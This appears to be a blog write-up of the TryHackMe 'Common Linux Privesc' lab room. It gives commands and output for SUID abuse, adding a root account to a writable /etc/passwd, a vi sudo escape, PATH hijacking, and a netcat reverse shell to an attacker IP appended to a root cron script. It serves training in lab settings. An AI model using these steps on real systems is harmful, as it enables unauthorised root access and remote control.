---
title: Writeup for TryHackMe room - Common Linux Privesc
author: 4n3i5v74
date: 2021-04-02 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, linux, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc){:target="_blank"}

This room contains info about linux privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}.


## Task 4 - Enumeration

Use these links as references.
- [LinEnum Reference](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh){:target="_blank"}
- [Gobuster Reference](https://4n3i5v74.github.io/posts/cheatsheet-gobuster/){:target="_blank"}
- [Enum4linux Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-enum4linux){:target="_blank"}


Download the `LinEnum` script.
{% capture code %}{% raw %}wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}--2021-04-18 04:55:49--  https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: \u2018LinEnum.sh\u2019

LinEnum.sh
[<=>] 541.01K  --.-KB/s    in 0.1s

2021-04-18 04:55:49 (4.04 MB/s) - \u2018LinEnum.sh\u2019 saved [553992]{% endraw %}{% endcapture %} {% include code.html code=code %}

Start a local `python webserver` so the `LinEnum` script can be downloaded from target.
{% capture code %}{% raw %}python3 -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

`SSH` to the target using the provided credentials `user3:password`.
{% capture code %}{% raw %}ssh user3@<target>{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `wget` to download the `Linenum` script.
{% capture code %}{% raw %}wget http://<ip>:8080/LinEnum.sh{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}--2021-04-17 23:57:07--  http://<ip>:8080/LinEnum.sh
Connecting to <ip>:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 553992 (541K) [text/x-sh]
Saving to: \u2018LinEnum.sh\u2019

LinEnum.sh                                 100%[=====================================================================================>] 541.01K  --.-KB/s    in 0.004s

2021-04-17 23:57:07 (141 MB/s) - \u2018LinEnum.sh\u2019 saved [553992/553992]{% endraw %}{% endcapture %} {% include code.html code=code %}

The status of access will be available in `python webserver` console.
{% capture code %}{% raw %}<ip> - - [18/Apr/2021 04:57:06] "GET /LinEnum.sh HTTP/1.1" 200 -{% endraw %}{% endcapture %} {% include code.html code=code %}

Run `LinEnum` script to find useful info.
{% capture code %}{% raw %}./LinEnum.sh{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 5 - Abusing SUID/GUID Files

Login to the target using credentials `user3:password`.

From previous `LinEnum.sh` script output, the file `/home/user3/shell` had `suid` bit set. It can also be checked using the following command.
{% capture code %}{% raw %}find . -perm -u=s -type f -exec ls -l {} \; 2>/dev/null{% endraw %}{% endcapture %} {% include code.html code=code %}

There will be an executable with `suid` permission set to `root` user.
{% capture code %}{% raw %}-rwsr-xr-x 1 root root 8392 Jun  4  2019 ./shell{% endraw %}{% endcapture %} {% include code.html code=code %}

Try executing the binary, `./shell`. An output similar to below will be obtained.
{% capture code %}{% raw %}You Can't Find Me
Welcome to Linux Lite 4.4 user3

Tuesday 20 April 2021, 00:19:34
Memory Usage: 333/1991MB (16.73%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 6 - Exploiting Writeable /etc/passwd

Login to the target using credentials `user7:password`.

From previous `LinEnum.sh` script output, it was found `/etc/passwd` was writable by the group `root`, and `user7` is part of group `root`.

A new encrypted password can be manually generated and updated in `/etc/passwd`.
{% capture code %}{% raw %}openssl passwd -1 -salt new 123{% endraw %}{% endcapture %} {% include code.html code=code %}

The obtained encrypted password can be used as a new user entry in `/etc/passwd` with uid `0`.
{% capture code %}{% raw %}new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}

The new entry can be validated by switching to new id `su - new` with password `123`. Root shell will be obtained.
{% capture code %}{% raw %}Welcome to Linux Lite 4.4

You are running in superuser mode, be very careful.

Tuesday 20 April 2021, 00:31:44
Memory Usage: 335/1991MB (16.83%)
Disk Usage: 6/217GB (3%)

root@polobox:~# {% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 7 - Escaping Vi Editor

Use these links as references.
- [Gtfobins Reference](https://gtfobins.github.io/){:target="_blank"}

Login to the target using credentials `user8:password`.

Check the sudo abilities of the user using `sudo -l`.

The output will be similar to
{% capture code %}{% raw %}Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi{% endraw %}{% endcapture %} {% include code.html code=code %}

`VI` can be exploited to gain `privilege shell` by the command `:!sh` from inside the editor.


## Task 8 - Exploiting Crontab

Login to the target using credentials `user4:password`.

From previous `LinEnum.sh` script output, the contents of `/etc/crontab` was found.
{% capture code %}{% raw %}# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the 'crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#{% endraw %}{% endcapture %} {% include code.html code=code %}

The script `/home/user4/Desktop/autoscript.sh` runs as root user, and can be enumerated to gain reverse shell.

Using `msfvenom`, generate reverse shell payload.
{% capture code %}{% raw %}msfvenom -p cmd/unix/reverse_netcat lhost=<source-ip> lport=443 R{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 94 bytes
mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1 ; rm /tmp/kaxkx{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the contents of the file `./Desktop/autoscript.sh`.
{% capture code %}{% raw %}touch /home/user4/abc.txt
echo "I will automate the process"
bash -i{% endraw %}{% endcapture %} {% include code.html code=code %}

Append the generated `reverse shell` to the end of file `./Desktop/autoscript.sh`.
{% capture code %}{% raw %}echo 'mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1 ; rm /tmp/kaxkx' >> Desktop/autoscript.sh{% endraw %}{% endcapture %} {% include code.html code=code %}

Using `netcat`, create a listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}

The reverse shell session will be created.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443)
Connection from <target-ip> 38864 received!

whoami
root{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 9 - Exploiting PATH Variable

Login to the target using credentials `user5:password`.

From previous `LinEnum.sh` script output, the file `/home/user5/script` had `suid` bit set. It can also be checked using the following command.
{% capture code %}{% raw %}find . -perm -u=s -type f -exec ls -l {} \; 2>/dev/null{% endraw %}{% endcapture %} {% include code.html code=code %}

There will be an executable with `suid` permission set to `root` user.
{% capture code %}{% raw %}-rwsr-xr-x 1 root root 8392 Jun  4  2019 ./script{% endraw %}{% endcapture %} {% include code.html code=code %}

Upon trying to run the file, `./script`, it can be guessed that the binary is running `ls` command. The output of both `./script` and `ls` provides same output.
{% capture code %}{% raw %}Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos{% endraw %}{% endcapture %} {% include code.html code=code %}

The same can also be validated by using `strings script`, and also to see if the binary is invoked using full path, or `$PATH` variable is being used.

If the binary does not use full command path, the `$PATH` variable can be exploited.
{% capture code %}{% raw %}cd /tmp
echo "/bin/bash" >ls
chmod +x ls
export PATH=/tmp:$PATH{% endraw %}{% endcapture %} {% include code.html code=code %}

When the binary is executed, `./script`, it now gives a `privilege shell`.
{% capture code %}{% raw %}Welcome to Linux Lite 4.4 user5

Tuesday 20 April 2021, 06:47:28
Memory Usage: 338/1991MB (16.98%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link){% endraw %}{% endcapture %} {% include code.html code=code %}

To reset the `$PATH` variable, use the following command.
{% capture code %}{% raw %}export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 10 - Expanding Your Knowledge

Use these links as references.
- [Linux Privilege Escalation Reference 1](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md){:target="_blank"}
- [Linux Privilege Escalation Reference 2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md){:target="_blank"}
- [Linux Privilege Escalation Reference 3](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html){:target="_blank"}
- [Linux Privilege Escalation Reference 4](https://payatu.com/guide-linux-privilege-escalation){:target="_blank"}

